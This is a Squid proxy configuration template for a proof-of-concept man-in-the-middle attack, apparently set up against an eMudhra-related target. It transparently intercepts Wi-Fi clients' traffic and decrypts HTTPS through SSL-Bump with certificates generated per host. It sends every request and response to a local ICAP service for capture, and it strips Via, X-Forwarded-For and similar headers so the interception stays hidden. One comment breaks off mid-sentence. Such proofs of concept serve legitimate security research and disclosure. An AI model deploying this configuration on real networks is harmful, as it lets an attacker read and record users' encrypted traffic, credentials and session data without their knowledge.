# Filename:         poc_squid.conf
# Description:      Template Squid proxy configuration for proof-of-concept MITM
# Author:           Adam A https://github.com/atariq11700
# Date Created:     2026-10-29
# License:          AGPL-3.0
# ==============================================================================

visible_hostname emudhra-poc
# Set permissions for files created by Squid
umask 0022

# Disable loading the system MIME table 
mime_table /dev/null

# Accept local proxy traffic and transparently intercepted traffic on the configured interface.
http_port 127.0.0.1:@squid_http_port@
http_port @interface_ip@:@squid_http_port@ intercept

# Configure intercepted TLS traffic for SSL-Bump; the certificate and key are generated at runtime.
# TLS versions below 1.3 are 
https_port @interface_ip@:@squid_https_port@ \
    intercept \
    ssl-bump \
    tls-options=NO_SSLv3,NO_TLSv1,NO_TLSv1_1,NO_TLSv1_2 \
    cert=@tmp_dir@/signing-chain.pem \
    key=@tmp_dir@/signing-key.pem \
    generate-host-certificates=on \
    dynamic_cert_mem_cache_size=4MB
tls_outgoing_options options=NO_SSLv3,NO_TLSv1,NO_TLSv1_1,NO_TLSv1_2

# Maintain dynamic certificate database used for generating per-host certificates
sslcrtd_program @certgen@ -s @tmp_dir@/squid/ssl_db -M 4MB
sslcrtd_children 5 startup=1 idle=1
acl bump_step1 at_step SslBump1
ssl_bump peek bump_step1
ssl_bump bump all

# Restrict proxy requests to clients on the configured Wi-Fi network
acl wifi_clients src @wifi_cidr@
http_access allow wifi_clients
http_access deny all

# Disable ICP and caching
icp_port 0
cache deny all

# Send request and response messages through the local ICAP capture service for dumping
icap_enable on
icap_service capture_resp respmod_precache bypass=1 icap://127.0.0.1:@icap_port@/capture
icap_service capture_req reqmod_precache bypass=1 icap://127.0.0.1:@icap_port@/capture
adaptation_access capture_resp allow all
adaptation_access capture_req allow all
adaptation_meta X-Request-Timestamp "%ts"
icap_io_timeout 30 seconds

# Logging setup
log_mime_hdrs on
logformat terminal %tl %>a %rm %ru %>Hs
access_log stdio:@tmp_dir@/squid/terminal.log logformat=terminal
access_log stdio:@tmp_dir@/squid/access.log
cache_log @tmp_dir@/squid/cache.log
pid_filename @tmp_dir@/squid/squid.pid
coredump_dir @tmp_dir@/squid

# Remove proxy headers
relaxed_header_parser on
via off
forwarded_for delete
request_header_access X-Forwarded-For deny all
request_header_access Via deny all
request_header_access Forwarded deny all
request_header_access X-Real-IP deny all
request_header_access Cache-Control deny all
request_header_access Connection deny all

reply_header_access Via deny all
reply_header_access X-Cache deny all
reply_header_access X-Cache-Lookup deny all
reply_header_access X-Squid-Error deny all